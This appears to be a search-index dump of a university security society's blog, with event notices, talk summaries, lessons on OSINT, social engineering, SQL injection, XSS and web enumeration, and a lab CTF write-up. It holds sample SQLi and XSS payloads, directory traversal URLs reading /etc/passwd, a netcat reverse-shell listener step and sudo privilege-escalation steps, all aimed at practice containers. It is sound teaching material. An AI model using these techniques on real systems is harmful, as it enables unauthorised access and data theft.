Escalation for OSCP \u0026 Beyond! Courtesy of Tib3rius Note, for the best write-up award you do not have to complete all challenges - it will be judged by all the CTF creators and must be emailed in one pdf or md file to comsec@live.coventry.ac.uk at the end of the event. We will be judging on repeatability and clarity of explanation. If you get stuck on a challenge - don’t get disheartened, it will not prevent you from doing the next day’s challenge. If you get stuck on a level drop us an email or message and we may give you a hint (depending on how merry we are feeling). Finally, the ComSec committee and three kings would like to thank the lecturers (Dan and James), Babzsichu and Sleepunderflow, as without them this CTF would have been impossible. A special mention also goes to our sponsors: CrowdStrike, HTB, Institute of Code and Tib3rius. Hope you have a great Christmas, The Three Kings and Comsec Committee -Jack, Martin and Tiago ","date":"2020-12-16","objectID":"/posts/12days_xmas_ctf/:0:0","tags":["Announcements","CTF"],"title":"12 Days of Christmas CTF","uri":"/posts/12days_xmas_ctf/"},{"categories":["Academic Year 2020-21"],"content":"Update 26/12/2020 Twas the night before ComSec CTF, when all through the ECB Not a computer was stirring, not even a mouse. The assortment of cables and adapters were hung by the chimney with care, In hopes that the Three Kings soon would be there. Hi, Just a quick note to remind you all that the ComSec CTF starts tomorrow (see above) and to wish you all a very merry Christmas. ComSec Committee, -Jack, Martin and Tiago ","date":"2020-12-16","objectID":"/posts/12days_xmas_ctf/:1:0","tags":["Announcements","CTF"],"title":"12 Days of Christmas CTF","uri":"/posts/12days_xmas_ctf/"},{"categories":["Academic Year 2020-21"],"content":"This week we had a talk by a second-year student, 0verfl0w_ about banking malware and his experience while working as a Principal Security Analyst. Additionally, he has developed a Beginner Malware Analysis Course, Zero2Automated, and worked with SentinelOne to develop free online training courses. Here is a copy of the presentation. If you have any questions, feel free to reach out to @0verfl0w_ on Twitter. ","date":"2020-12-09","objectID":"/posts/bankingmalware_overfl0w/:0:0","tags":["0verfl0w_","guest","Banking Malware"],"title":"Guest - 0verfl0w_ - Banking Malware","uri":"/posts/bankingmalware_overfl0w/"},{"categories":["Academic Year 2020-21"],"content":"Our university has been hacked!!!! CrowdStrike and ComSec request your help in identifying the malicious attackers. Can you help us identify the attackers before Warwick, Southampton and Edinburgh Napier do? This week we will complete a blue team, security operation centre type challenge! Unfortunately, places are limited this week, and require booking in advance - to book, view our post on either Aula or Discord ","date":"2020-12-04","objectID":"/posts/crowdstrike_event/:0:0","tags":["CrowdStrike","guest","Blue Teaming"],"title":"CrowdStrike Event","uri":"/posts/crowdstrike_event/"},{"categories":["Academic Year 2020-21"],"content":"Who are CrowdStrike? ‘CrowdStrike was founded in 2011 to fix a fundamental problem: The sophisticated attacks that were forcing the world’s leading businesses into the headlines could not be solved with existing malware-based defences. Co-founders George Kurtz and Dmitri Alperovitch realized that a brand-new approach was needed — one that combines the most advanced endpoint protection with expert intelligence to pinpoint the adversaries perpetrating the attacks, not just the malware.’ ","date":"2020-12-04","objectID":"/posts/crowdstrike_event/:1:0","tags":["CrowdStrike","guest","Blue Teaming"],"title":"CrowdStrike Event","uri":"/posts/crowdstrike_event/"},{"categories":["Academic Year 2020-21"],"content":"Disclaimer If you have not already guessed, and to cover our backs (for legal purposes) the university has not been hacked and this is a blue team simulation experience (the university infrastructure will not be touched in any way) ","date":"2020-12-04","objectID":"/posts/crowdstrike_event/:2:0","tags":["CrowdStrike","guest","Blue Teaming"],"title":"CrowdStrike Event","uri":"/posts/crowdstrike_event/"},{"categories":["Academic Year 2020-21"],"content":"An introduction to ROP chains by Sleepunderflow","date":"2020-11-28","objectID":"/posts/sleepunderflow_rop/","tags":["ROP Chains","guest","Sleepunderflow"],"title":"Guest - ROP Chains","uri":"/posts/sleepunderflow_rop/"},{"categories":["Academic Year 2020-21"],"content":"This week, we had a talk by graduate student and security consultant at Nettitude, Sleepunderflow! To view the materials he used, head to his GitHub Repo ","date":"2020-11-28","objectID":"/posts/sleepunderflow_rop/:0:0","tags":["ROP Chains","guest","Sleepunderflow"],"title":"Guest - ROP Chains","uri":"/posts/sleepunderflow_rop/"},{"categories":["Academic Year 2020-21"],"content":"Resources Presentation Slides Live Session Recording ","date":"2020-11-28","objectID":"/posts/sleepunderflow_rop/:0:1","tags":["ROP Chains","guest","Sleepunderflow"],"title":"Guest - ROP Chains","uri":"/posts/sleepunderflow_rop/"},{"categories":["Academic Year 2020-21"],"content":"An introduction to buffer overflows, by guest lecturer Dan.","date":"2020-11-18","objectID":"/posts/dan_buffer_overflow/","tags":["buffer overflow","guest","Dan"],"title":"Guest Lecturer - Buffer Overflows","uri":"/posts/dan_buffer_overflow/"},{"categories":["Academic Year 2020-21"],"content":"This week we had a guest lecture by Dan, a senior lecturer at Coventry University. To view his materials and challenges, please visit Coventry University GitHub. ","date":"2020-11-18","objectID":"/posts/dan_buffer_overflow/:0:0","tags":["buffer overflow","guest","Dan"],"title":"Guest Lecturer - Buffer Overflows","uri":"/posts/dan_buffer_overflow/"},{"categories":["Academic Year 2020-21"],"content":"This week, I gave an introductory talk on open-source intelligence (OSINT) and social engineering. We also delved into the theories of why social engineering can be a successful attack and why humans are vulnerable to it! ","date":"2020-11-11","objectID":"/posts/osint_social_engineering/:0:0","tags":["OSINT","Social Engineering","exiftool"],"title":"OSINT \u0026 Social Engineering","uri":"/posts/osint_social_engineering/"},{"categories":["Academic Year 2020-21"],"content":"Resources Presentation Slides ","date":"2020-11-11","objectID":"/posts/osint_social_engineering/:0:1","tags":["OSINT","Social Engineering","exiftool"],"title":"OSINT \u0026 Social Engineering","uri":"/posts/osint_social_engineering/"},{"categories":["Academic Year 2020-21"],"content":"OSINT Open-Source Intelligence is the art of finding information from publicly available sources. This is crucial in pen testing (as the more you know about the company you are hacking – the easier it can become). The main benefit of OSINT is that it is a form of passive reconnaissance (so legal) as all information is already in the public domain. Warning Although it is legal to access documents in the public domain, you must be wary of stalking rules and people’s right to a private life (see the Human Rights Act 1998 Article 8). ","date":"2020-11-11","objectID":"/posts/osint_social_engineering/:1:0","tags":["OSINT","Social Engineering","exiftool"],"title":"OSINT \u0026 Social Engineering","uri":"/posts/osint_social_engineering/"},{"categories":["Academic Year 2020-21"],"content":"Good Places Google Social Media Electoral-role Companies House Wayback Machine GitHub Repositories Sherlock Maltego ","date":"2020-11-11","objectID":"/posts/osint_social_engineering/:1:1","tags":["OSINT","Social Engineering","exiftool"],"title":"OSINT \u0026 Social Engineering","uri":"/posts/osint_social_engineering/"},{"categories":["Academic Year 2020-21"],"content":"Image Metadata What is in the image can provide useful information, like: Employee badge number Signs (to tell location) Confidential documents What is on their computer screen (may give away confidential information/IT programs \u0026 systems they use) Faces (can you identify anyone?) An image can paint a thousand words, well at least the metadata can; the sort of thing you can find is: Location data Device type Dates ","date":"2020-11-11","objectID":"/posts/osint_social_engineering/:2:0","tags":["OSINT","Social Engineering","exiftool"],"title":"OSINT \u0026 Social Engineering","uri":"/posts/osint_social_engineering/"},{"categories":["Academic Year 2020-21"],"content":"Viewing Metadata To view metadata in Linux, I recommend using exiftool: exiftool image.png Or on Windows you can view the image properties (but please note this will not always show all the metadata fields). ","date":"2020-11-11","objectID":"/posts/osint_social_engineering/:2:1","tags":["OSINT","Social Engineering","exiftool"],"title":"OSINT \u0026 Social Engineering","uri":"/posts/osint_social_engineering/"},{"categories":["Academic Year 2020-21"],"content":"Old Websites \u0026 GitHub Repositories Ever accidently published private information to a website – well it may have been cached by either Google or Wayback Machine. Ever done the same to GitHub? Check old Git commit history! ","date":"2020-11-11","objectID":"/posts/osint_social_engineering/:3:0","tags":["OSINT","Social Engineering","exiftool"],"title":"OSINT \u0026 Social Engineering","uri":"/posts/osint_social_engineering/"},{"categories":["Academic Year 2020-21"],"content":"Social Engineering - Hacking the Mind This is the art of tricking people into trusting you or doing things that they would not normally do. It normally involves you making people believe you have authority (hi Vis Test - see below). This is because we like to be trusting and helpful to others (generally). For example, if someone helps you, you are more likely to help them. ","date":"2020-11-11","objectID":"/posts/osint_social_engineering/:4:0","tags":["OSINT","Social Engineering","exiftool"],"title":"OSINT \u0026 Social Engineering","uri":"/posts/osint_social_engineering/"},{"categories":["Academic Year 2020-21"],"content":"Why The reason why this works is because humans are creatures of habit and have a cognitive bias. This means that our brains will make subconscious decisions for us. Below are some of the theories around this topic if you would like to find out more: Stereotyping ‘Going with the Group’ Bias Blindness Matching Social Resistiveness Confirmation Bias ","date":"2020-11-11","objectID":"/posts/osint_social_engineering/:4:1","tags":["OSINT","Social Engineering","exiftool"],"title":"OSINT \u0026 Social Engineering","uri":"/posts/osint_social_engineering/"},{"categories":["Academic Year 2020-21"],"content":"Uses in the Real World Scams Phishing Gaining unauthorised access (tailgating) ","date":"2020-11-11","objectID":"/posts/osint_social_engineering/:4:2","tags":["OSINT","Social Engineering","exiftool"],"title":"OSINT \u0026 Social Engineering","uri":"/posts/osint_social_engineering/"},{"categories":["Academic Year 2020-21"],"content":"Uniform One joke for social engineers is that you will need a Hi Vis jacket, but why is that the case? Many believe that Hi Vis jackets make people look more authoritative and official - therefore they are more likely to listen to them. To prove this point comedian and scientist Eline van der Velden donned a jacket and clipboard; then asked random people to complete ridiculous requests - see the results below. The Milgram Experiment The above was done to prove a point and builds on more historic research. In 1963 Stanley Milgram investigated the difference between obedience and free will. The main reason for this was at the time the Nuremberg War Criminal trials were taking place; and many people argued they carried out genocides as they were just following orders. The experiment worked by attaching someone to an electric shock machine. Then a volunteer had to ask that person questions; if they got one wrong, they would have to administer an electric shock - each one progressively worse. If the volunteer declined, they were told they must by an authoritative figure. In a similar experiment, Milgram repeated it with people wearing uniform - one was with the authoritative figure wearing a grey lab coat and one wearing plain clothes. 20% more people would listen to the person wearing the lab coat. For more information about this experiment, I recommend you read my source - an article written by Saul McLeod on Simply Psychology ","date":"2020-11-11","objectID":"/posts/osint_social_engineering/:4:3","tags":["OSINT","Social Engineering","exiftool"],"title":"OSINT \u0026 Social Engineering","uri":"/posts/osint_social_engineering/"},{"categories":["Academic Year 2020-21"],"content":"The Challenge This week’s challenges can be found on the CTFd server - there are two sections to complete: OSINT OSINT the picture Identify the device that took the pictures Find the flag hidden in GitHub, hidden in the ComSec website repo Complete the Office Space challenges on CTFd ","date":"2020-11-11","objectID":"/posts/osint_social_engineering/:5:0","tags":["OSINT","Social Engineering","exiftool"],"title":"OSINT \u0026 Social Engineering","uri":"/posts/osint_social_engineering/"},{"categories":["Academic Year 2020-21"],"content":"Go Further Research more cognitive biases Look at TraceLabs Complete the OSINT room on TryHackMe ","date":"2020-11-11","objectID":"/posts/osint_social_engineering/:6:0","tags":["OSINT","Social Engineering","exiftool"],"title":"OSINT \u0026 Social Engineering","uri":"/posts/osint_social_engineering/"},{"categories":["Academic Year 2020-21"],"content":"This week we will begin to look at website exploitation, using the OWASP top 10. The main areas we will cover are: Good notes, and their importance Making notes with Markdown What is website exploitation? Introduction to OWASP top 10 SQL Injection Sqlmap Cross-Site Scripting (XSS) Sensitive Data Exposure ","date":"2020-11-04","objectID":"/posts/owasp_sqli_xss/:0:0","tags":["web","OWASP","XSS","SQLi"],"title":"Web Exploitation \u0026 OWASP","uri":"/posts/owasp_sqli_xss/"},{"categories":["Academic Year 2020-21"],"content":"Resources Presentation Slides ","date":"2020-11-04","objectID":"/posts/owasp_sqli_xss/:0:1","tags":["web","OWASP","XSS","SQLi"],"title":"Web Exploitation \u0026 OWASP","uri":"/posts/owasp_sqli_xss/"},{"categories":["Academic Year 2020-21"],"content":"Note Taking Effective hacking requires a thorough and methodological approach. Additionally, in the workplace you will have to report findings to clients and be able to work with others. Finally, they are useful as a point of reference in the future. They don’t have to be long and laborious - short and sweet can be best (such as recording command outputs). For an example of good note checking, have a look at this by Dan. ","date":"2020-11-04","objectID":"/posts/owasp_sqli_xss/:1:0","tags":["web","OWASP","XSS","SQLi"],"title":"Web Exploitation \u0026 OWASP","uri":"/posts/owasp_sqli_xss/"},{"categories":["Academic Year 2020-21"],"content":"Markdown All three of the ComSec committee uses Markdown - this is a simplistic language great for taking notes. Personally, I prefer it to other options because of code fences with syntax highlighting and, as it is open source, many programs can display it in its formatted form. Finally, it is easy to export Markdown to different formats, e.g. All the content on this website has been exported to HTML from Markdown. ","date":"2020-11-04","objectID":"/posts/owasp_sqli_xss/:2:0","tags":["web","OWASP","XSS","SQLi"],"title":"Web Exploitation \u0026 OWASP","uri":"/posts/owasp_sqli_xss/"},{"categories":["Academic Year 2020-21"],"content":"Editor Choice As said above, you can open/use multiple programs to edit ComSec articles. Here are some of our favourites: Joplin - Martin’s and my favourite Obsidian.md - Tiago’s favourite Visual Studio Code - great for making changes for files or don’t want them stored in a central location. I also use VS Code to write assignments in Markdown ","date":"2020-11-04","objectID":"/posts/owasp_sqli_xss/:2:1","tags":["web","OWASP","XSS","SQLi"],"title":"Web Exploitation \u0026 OWASP","uri":"/posts/owasp_sqli_xss/"},{"categories":["Academic Year 2020-21"],"content":"Markdown Syntax • (Mostly) The same syntax as Discord/GitHub (due to slightly different implementations) • # Make a Heading • ## Make a smaller header (can use up to six #) • *make this italic* • **make this bold** • ***make this bold \u0026 italic*** • [Enter text](enter hyperlink) • ![Image name](image hyperlink) • Inline embed: `test` • ```python print(\"Format this code like Python\") ```Example of code fences ","date":"2020-11-04","objectID":"/posts/owasp_sqli_xss/:2:2","tags":["web","OWASP","XSS","SQLi"],"title":"Web Exploitation \u0026 OWASP","uri":"/posts/owasp_sqli_xss/"},{"categories":["Academic Year 2020-21"],"content":"Web Exploitation Website exploitation is when you can make a website act in a way it shouldn’t; typically, with the aim of gaining access to the underlying system or ‘protected information’. ","date":"2020-11-04","objectID":"/posts/owasp_sqli_xss/:3:0","tags":["web","OWASP","XSS","SQLi"],"title":"Web Exploitation \u0026 OWASP","uri":"/posts/owasp_sqli_xss/"},{"categories":["Academic Year 2020-21"],"content":"OWASP The Open Web Application Security Project (OWASP) is a non-profit organisation that, every four years, releases a list named The OWASP Top 10. This list shows the most critical flaws that can be found in websites. The current list, released in 2017 is: Injection Broken Authentication Sensitive Data Exposure XML External Entities Broken Access Control Security Misconfigurations Cross Site Scripting (XSS) Insecure Deserialization Using components with known vulnerabilities Insufficient Logging and Monitoring These are important to look for when creating/pen testing websites as they can lead to easy targeting. ","date":"2020-11-04","objectID":"/posts/owasp_sqli_xss/:3:1","tags":["web","OWASP","XSS","SQLi"],"title":"Web Exploitation \u0026 OWASP","uri":"/posts/owasp_sqli_xss/"},{"categories":["Academic Year 2020-21"],"content":"Injection Attacks This is the most critically rated website vulnerability and is where an attacker can convince a user input box to run a command/code. The most common form of injection attacks target SQL databases. ","date":"2020-11-04","objectID":"/posts/owasp_sqli_xss/:4:0","tags":["web","OWASP","XSS","SQLi"],"title":"Web Exploitation \u0026 OWASP","uri":"/posts/owasp_sqli_xss/"},{"categories":["Academic Year 2020-21"],"content":"SQL Injection SQLi (SQL Injection) is a form of attack which allows you to carry out commands on an underlying database. This can be dangerous, especially when the database contains private information. So, let’s examine some SQL that you may use for a login page SELECT * FROM userTable WHERE username=userinput For normal usage this would be fine, as this is what would be formed during normal usage: SELECT * FROM userTable WHERE username=\"jack\" And if a database entry is found, you could log in. The problem occurs when a malicious payload is entered, like \" OR 1=1; - -. This would form the following: SELECT * FROM userTable WHERE username=\"\" OR 1=1; --\"; This would print out the whole table as 1=1 equates to true and – comments out the rest of the statement. There are also further payloads that can be used, but we’ll cover this another time, as we must move on. ","date":"2020-11-04","objectID":"/posts/owasp_sqli_xss/:4:1","tags":["web","OWASP","XSS","SQLi"],"title":"Web Exploitation \u0026 OWASP","uri":"/posts/owasp_sqli_xss/"},{"categories":["Academic Year 2020-21"],"content":"Sqlmap As great as exploiting manually is, sometimes it is best to use prebuilt tools to automate the process; the most notable being sqlmap. The general command is sqlmap –a –u ‘http://example.com’ This runs all scripts against an URL. For more granular control, use --help to find the right flags. ","date":"2020-11-04","objectID":"/posts/owasp_sqli_xss/:4:2","tags":["web","OWASP","XSS","SQLi"],"title":"Web Exploitation \u0026 OWASP","uri":"/posts/owasp_sqli_xss/"},{"categories":["Academic Year 2020-21"],"content":"Cross Site Scripting (XSS) This is when clients can inject html commands into an input field. The problem with this is that they can use this to execute JavaScript code. This type of exploit can typically be found on web forums. The easiest way to test this is to attempt to create an alert box. \u003cscript\u003ealert(\"demo XSS exploit\") \u003c/script\u003e There are also more ways to run JavaScript as it can sometimes be possible to bypass XSS protections. The best way to check is to a fuzzer and the XSS payload list from Seclists. ","date":"2020-11-04","objectID":"/posts/owasp_sqli_xss/:5:0","tags":["web","OWASP","XSS","SQLi"],"title":"Web Exploitation \u0026 OWASP","uri":"/posts/owasp_sqli_xss/"},{"categories":["Academic Year 2020-21"],"content":"More than just a popup? With JavaScript you can do more evil things: Steal cookies \u0026 send them to a remote server (could lead to session hijacking) Deface websites (E.g., create tech support scam pop-ups) Preform actions on behalf of the user (such as transactions) Create iframes – this can allow you to embed different webpages into one another. One use of this could be to spoof a login page (so instead of logging in they send credentials to your server) – great for phishing! Capture keystrokes Read all the data on a victim’s webpage (could reveal sensitive information). Please note that this was a quick intro to a larger topic, if you wish to find out more, I recommend this article. ","date":"2020-11-04","objectID":"/posts/owasp_sqli_xss/:5:1","tags":["web","OWASP","XSS","SQLi"],"title":"Web Exploitation \u0026 OWASP","uri":"/posts/owasp_sqli_xss/"},{"categories":["Academic Year 2020-21"],"content":"Sensitive Data Exposure This is when websites accidently expose/leak sensitive data. This could be: In transit – using HTTP/unencrypted communication. Having public S3 buckets/insecure databases. Leaving keys in Git repositories / view previous website archives. Using unprotected/default passwords Leaving API keys/admin credentials in code comments So, in essence it is anywhere where private data can be exposed. ","date":"2020-11-04","objectID":"/posts/owasp_sqli_xss/:6:0","tags":["web","OWASP","XSS","SQLi"],"title":"Web Exploitation \u0026 OWASP","uri":"/posts/owasp_sqli_xss/"},{"categories":["Academic Year 2020-21"],"content":"Challenge This week’s challenge is to: use DVWA – this can be run locally or on THM (need an account) Start hacking the SQL \u0026 XSS challenges Enter flags you find on the ComSec CTFd ","date":"2020-11-04","objectID":"/posts/owasp_sqli_xss/:7:0","tags":["web","OWASP","XSS","SQLi"],"title":"Web Exploitation \u0026 OWASP","uri":"/posts/owasp_sqli_xss/"},{"categories":["Academic Year 2020-21"],"content":"Further Challenges THM OWASP Room ","date":"2020-11-04","objectID":"/posts/owasp_sqli_xss/:8:0","tags":["web","OWASP","XSS","SQLi"],"title":"Web Exploitation \u0026 OWASP","uri":"/posts/owasp_sqli_xss/"},{"categories":["Academic Year 2020-21"],"content":"This week, we had a talk by a graduate student about his experiences and the importance of practise and CTF competitions. ","date":"2020-10-28","objectID":"/posts/ziemni/","tags":["talk","HTB","Graduate","Ziemni"],"title":"Graduate Talks - Ziemni","uri":"/posts/ziemni/"},{"categories":["Academic Year 2020-21"],"content":"This week we had a presentation by a graduate student, Ziemni. He is currently studying for a Masters in Cybersecurity Management \u0026 is frequently in the HackTheBox top 10. He details how he has improved himself throughout his time at Coventry University \u0026 the importance of practising hacking. The main talking points were: Ziemni’s background Where to start/background Importance of CTFs \u0026 Practice Different CTF programs Live HTB demo ","date":"2020-10-28","objectID":"/posts/ziemni/:0:0","tags":["talk","HTB","Graduate","Ziemni"],"title":"Graduate Talks - Ziemni","uri":"/posts/ziemni/"},{"categories":["Academic Year 2020-21"],"content":"Resources Here are the Presentation Slides. Also, to find out more about Ziemni, please visit his website. ","date":"2020-10-28","objectID":"/posts/ziemni/:0:1","tags":["talk","HTB","Graduate","Ziemni"],"title":"Graduate Talks - Ziemni","uri":"/posts/ziemni/"},{"categories":["Academic Year 2020-21"],"content":"Web Enumeration ctf Start your docker instances and let’s hack! 8 flags inside this machine Every time first thing to do Nmap scan Look at your scan results. So we have one port open 3838/tcp and we have at least one directory ‘/legal’ and one file robots.txt and the box is running nginx. First thing lets open the browser and navigate to 172.17.0.2 Get a good look at the source code and the style.css and should be able to find the flag1. Well this week is all about list and enumerating web apps so let’s do it. You have a lot of tools from gobuster, ffuf, dirbuster and etc. I’ll be using dirbuster. Dirbuster is better for recursion. Looks like we have a lot more inside this Web App. ","date":"2020-10-28","objectID":"/posts/web_enum_writeup/:0:0","tags":["writeup","reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration Writeup","uri":"/posts/web_enum_writeup/"},{"categories":["Academic Year 2020-21"],"content":"Robots.txt Lets go to robots.txt. Robots.txt is always a good spot to look for flags in ctfs and sometimes u can get information about other directories will you wait for your scans and scripts to end. You should have one flag2. ","date":"2020-10-28","objectID":"/posts/web_enum_writeup/:1:0","tags":["writeup","reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration Writeup","uri":"/posts/web_enum_writeup/"},{"categories":["Academic Year 2020-21"],"content":"/legal/ How boring can we be? Actually is always good to remind you guys we are living in the grey area. Here you have the first 2 sections of the Computer Misuse act 1990. Opens your eyes cause in the middle of all of those words you should be able to find flag3 you just need to loose and 10 secs in cyberchef and one more is done. ","date":"2020-10-28","objectID":"/posts/web_enum_writeup/:2:0","tags":["writeup","reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration Writeup","uri":"/posts/web_enum_writeup/"},{"categories":["Academic Year 2020-21"],"content":"/legal/papers Hm how good are you at web dev? Do you guys know which tags you can use while inserting an image? Do you what the alt tag does? If you don’t while do a brief explanation. So inside the alt=’’ tag you will have alternate text that will be shown when the image cannot be displayed. Look at the alt tag for this image and flag4 is done. ","date":"2020-10-28","objectID":"/posts/web_enum_writeup/:2:1","tags":["writeup","reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration Writeup","uri":"/posts/web_enum_writeup/"},{"categories":["Academic Year 2020-21"],"content":"404 404 is a page that can be really important for the attacker if not well setup. From the 404 page we can sometimes extract important information for example the version of the distro or server ,etc. This kinds of information can be really important sometimes to find CVES and other vulns. By the way, always check the source code. ","date":"2020-10-28","objectID":"/posts/web_enum_writeup/:3:0","tags":["writeup","reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration Writeup","uri":"/posts/web_enum_writeup/"},{"categories":["Academic Year 2020-21"],"content":".well-known/security.txt Have you heard of this directory before? If you haven’t you can read about it here{target=_blank}. Always good to check. ","date":"2020-10-28","objectID":"/posts/web_enum_writeup/:4:0","tags":["writeup","reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration Writeup","uri":"/posts/web_enum_writeup/"},{"categories":["Academic Year 2020-21"],"content":"Flag.txt Looks like we can’t see this file maybe after getting our reverse shell we will be able to. ","date":"2020-10-28","objectID":"/posts/web_enum_writeup/:5:0","tags":["writeup","reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration Writeup","uri":"/posts/web_enum_writeup/"},{"categories":["Academic Year 2020-21"],"content":"wp-content Let’s go back to the dirbuster scan, you have a page called wp-content. For the people that don’t know this is the standard page for uploading files in wordpress. Get your reverse shells from pentestmonkeys upload the file. It will appear as a link in the same page. Before clicking it, run your netcat in the terminal nc -lvnp 1234 Go back to the browser and click the file and you should have the tty. Navigate to /var/www/ and cat the flag.txt Flag7 only one left. Let’s get root. So without using any script lets enumerate the SUID permissions using find / -perm /4000 2\u003e/dev/null Looks like we can run sudo. Lets look for the permissions. sudo -l If you do id now you will be able to see you are root. cat /root/flag.txt Done Congrats! ","date":"2020-10-28","objectID":"/posts/web_enum_writeup/:6:0","tags":["writeup","reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration Writeup","uri":"/posts/web_enum_writeup/"},{"categories":["Academic Year 2020-21"],"content":"In this session, we will look at website enumeration and exploitation. This is what we will cover in further detail: What is Enumeration? Directory Brute Forcing Checking Comments \u0026 Common Files Directory Traversal Google Dorking (basics) Server Fingerprinting \u0026 Other Tools Web Shells ","date":"2020-10-22","objectID":"/posts/web_enum/:0:0","tags":["reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration","uri":"/posts/web_enum/"},{"categories":["Academic Year 2020-21"],"content":"Resources Presentation Slides Live Session Recording ","date":"2020-10-22","objectID":"/posts/web_enum/:0:1","tags":["reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration","uri":"/posts/web_enum/"},{"categories":["Academic Year 2020-21"],"content":"What is Enumeration? Enumeration is the process of going through a list, one by one, to find information. This is used in hacking to find information to leverage an attack. ","date":"2020-10-22","objectID":"/posts/web_enum/:1:0","tags":["reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration","uri":"/posts/web_enum/"},{"categories":["Academic Year 2020-21"],"content":"Directory Enumeration This is when you use a wordlist to try to guess the names of web pages/directories. The reason for this is: It allows you to build a sitemap/understand layout Find hidden directories Popular tools include: Dirb/Dirbuster, Nmap’s http-enum script. ","date":"2020-10-22","objectID":"/posts/web_enum/:1:1","tags":["reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration","uri":"/posts/web_enum/"},{"categories":["Academic Year 2020-21"],"content":"Code Comments \u0026 Common Files It can be surprising, the kind of comments that can make it into a product: Credentials API keys Software Versions Infrastructure layout \u0026 the occasional bit of profanity! All this information can then all be helpful in the exploitation phase. Common files (as defined by RFC rules) are locations where useful information about a website is stored .well-known/ - normally contains information regarding software, such as PGP keys. Also, many sites are starting have a text file stored at .well-known/security.txt which tells you how to report security flaws. robots.txt - this is a very good place to check and is used by webmasters to tell search engines which pages not to index - this can, in turn, reveal the location of admin portals. For an example, check this site’s robots.txt Sitemap.xml - another way to improve SEO - it shows the layout of a website - check ours here. /wp-admin/ - shows the website runs WordPress, so you can check out vulnerabilities related to this platform. Also make sure that you check any interesting results from website enumeration, like pages with http authentication. ","date":"2020-10-22","objectID":"/posts/web_enum/:2:0","tags":["reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration","uri":"/posts/web_enum/"},{"categories":["Academic Year 2020-21"],"content":"Google Dorking This is where you use the magic of Google do all the work for you. This is because you can use the following keywords to find out information from websites: site: specify domain filetype: specify a file extension, good files to look for are pdf, docx and database extensions as they can leak personal information inurl: search for URLs which contain a keyword intext: search for pages with keywords in the body insite: search for pages with keywords in the body \u0026 headers intitle: search for pages with a keyword in the title cache: view Google archived versions of the page “search term” – search for that exact word or phrase ","date":"2020-10-22","objectID":"/posts/web_enum/:3:0","tags":["reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration","uri":"/posts/web_enum/"},{"categories":["Academic Year 2020-21"],"content":"Another Type of Search Engine Shodan \u0026 ZoomEye: Searches and indexes devices on the internet (from IoT to web servers) Attempts to see what services devices are running Tests to see if they are running default credentials WARNING: these services can give credentials on how to access devices – please do not do this without permission of the owner as it is classed as hacking! ","date":"2020-10-22","objectID":"/posts/web_enum/:4:0","tags":["reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration","uri":"/posts/web_enum/"},{"categories":["Academic Year 2020-21"],"content":"Server Fingerprinting \u0026 Other Tools Can be used to find out about the software a server is running: Nikto Nessus Zap Burpsuite Wappalyzer ","date":"2020-10-22","objectID":"/posts/web_enum/:5:0","tags":["reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration","uri":"/posts/web_enum/"},{"categories":["Academic Year 2020-21"],"content":"Exploitation We will not delve deep into the exploitation phase this week; however, we will investigate the following concepts (and they may be helpful in this week’s challenges hint hint) ","date":"2020-10-22","objectID":"/posts/web_enum/:6:0","tags":["reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration","uri":"/posts/web_enum/"},{"categories":["Academic Year 2020-21"],"content":"Directory Traversal This is an age-old attack, found on PHP servers. It can occur when you see addresses like https://example.com?file=test.txt due to php being used to fetch files and render them in your browser. So, what could be the problem? Well, the above is just a file path, so if you know a valid file path, you may be able to fetch any file. So, examples are: https://example.com?file=../../../etc/passwd - can be used to find usernames https://example.com?file=../../root/flag.txt - can be used to find root flag files ","date":"2020-10-22","objectID":"/posts/web_enum/:6:1","tags":["reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration","uri":"/posts/web_enum/"},{"categories":["Academic Year 2020-21"],"content":"Web Shells Probably one of the most useful ways to exploit a webserver is when you can upload a shell - allowing command execution. This can be done either by file upload or via uploading to an anonymous FTP server (but there are also other methods). There are two main web shells that I recommend, the first being p0wny@shell:~#. This is the friendlier of the two as you can access it via a webpage, however it has less features (but they are more than adequate for this week’s challenge). The second of the two is my favourite and is the Pentest Monkey Reverse TCP shell. The downside to this is that you must edit the file to include your attacking IP address and port number, as well as setting up a netcat listener. The benefit is that you can interact with it through your command line. ","date":"2020-10-22","objectID":"/posts/web_enum/:6:2","tags":["reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration","uri":"/posts/web_enum/"},{"categories":["Academic Year 2020-21"],"content":"The Challenge Open Kali Terminal sudo docker run --name csw1 --rm cuehcomsec/2-webenumeration Find the webserver port using Nmap (the port will change every time you run it!) There are 8 flags to find \u0026 submit on CTFd; format cueh{flag#sometext} To end the container, type: docker kill csw1 The writeup will be released next week. ","date":"2020-10-22","objectID":"/posts/web_enum/:7:0","tags":["reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration","uri":"/posts/web_enum/"},{"categories":["Academic Year 2020-21"],"content":"Extra Challenges If you would like more challenges related to this week’s topics, we recommend: Google Dorking (THM) RootMe (THM) ","date":"2020-10-22","objectID":"/posts/web_enum/:8:0","tags":["reconnaissance","enumeration","Nmap","Web Shells"],"title":"Web Enumeration","uri":"/posts/web_enum/"},{"categories":["Academic Year 2020-21"],"content":"A writeup for the introduction to ComSec challenges.","date":"2020-10-21","objectID":"/posts/welcome_nmap_writeup/","tags":["welcome","TryHackMe","Nmap","writeup"],"title":"ComSec Introduction Writeup","uri":"/posts/welcome_nmap_writeup/"},{"categories":["Academic Year 2020-21"],"content":"Nmap 1 Welcome to ComSec’s first challenge! This week we will be targeting a docker container, to start it, issue the following two commands: $ wget 